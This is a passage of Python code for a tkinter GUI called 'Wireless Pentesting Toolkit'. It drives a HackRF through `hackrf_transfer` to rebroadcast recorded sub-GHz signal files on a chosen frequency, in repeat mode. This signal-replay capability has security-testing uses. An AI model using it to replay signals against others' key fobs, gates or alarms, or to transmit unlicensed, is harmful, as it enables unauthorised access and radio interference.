    execute_button = tk.Button(content_frame, text="Stop Transmitting. Terminate.", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
                           command=lambda: stop_capturing(execute_button))
    execute_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")

    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda: stop_capturing(back_button))
    back_button.grid(row=3, column=0, padx=10, pady=10, sticky='nsew')

    thread = threading.Thread(target=transmit_signal, args=(fp, int(float(fr) * 1000000), 2000000, 1, 23))
    thread.start()

def transmit_signal(input_file, frequency, sample_rate, antenna_gain, tx_gain):
    global transmitting_process
    command = [
        'hackrf_transfer',
        '-t', input_file,
        '-f', str(frequency),
        '-s', str(sample_rate),
        '-a', str(antenna_gain),
        '-x', str(tx_gain),
        '-R'
    ]
    try:
        transmitting_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except Exception:
        pass

def add_to_freq(char):
    global freq_entry
    freq_entry.insert(tk.END, char)

def clear_freq():
    global freq_entry
    freq_entry.delete(0, tk.END)

def new_frame(frame):
    # Clears all widgets from the given frame
    for widget in frame.winfo_children():
        widget.destroy()


def create_file(freq):
    directory = "/device/subghz/signals"
    max_files = 9
    for num in range(1, max_files + 1):
        filename = f"Signal_{num}_{freq}.complex16s"
        filepath = os.path.join(directory, filename)
        # If file does not exist, or we're cycling back to start overwriting
        if not os.path.exists(filepath) or num == max_files:
            return filepath
    # If all files exist and max is reached, start overwriting from the first file
    return os.path.join(directory, f"Signal_1_{freq}.complex16s")







root = tk.Tk()
root.title("Wireless Pentesting Toolkit")
root.attributes('-fullscreen', True)  # Fullscreen mode

# Main content frame
content_frame = tk.Frame(root, bg="#282828")
content_frame.pack(fill='both', expand=True)

# Control frame for exit button
exit_control_frame = tk.Frame(root, bg="#282828")
exit_control_frame.pack(side='bottom', fill='x')

# Exit button
exit_button = tk.Button(exit_control_frame, text="Exit", command=root.quit, bg='red', fg='white')
exit_button.pack(side='left', fill='x')

# Bind the escape key to exit
root.bind('<Escape>', lambda e: root.quit())

# Display main page
main_page()

root.mainloop()